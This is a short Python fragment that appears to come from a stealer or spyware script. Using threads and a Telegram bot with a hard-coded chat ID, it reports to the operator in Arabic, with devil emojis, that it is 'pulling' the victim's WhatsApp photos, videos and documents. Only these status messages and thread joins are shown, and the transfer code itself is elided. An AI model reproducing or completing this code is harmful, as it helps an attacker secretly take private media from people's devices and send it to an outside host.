...
for thread in threads:
    thread.join()
bot.send_message(chat_id=7477381053, text= 'جاري سحب صور الواتساب 🔥😈')
...
bot.send_message(chat_id=7477381053, text= 'جاري سحب فيديوهات الواتساب 🚀😈')    
...
for thread in threads:
    thread.join()
bot.send_message(chat_id=7477381053, text= 'جاري سحب مستندات الواتساب 🚀😈')    
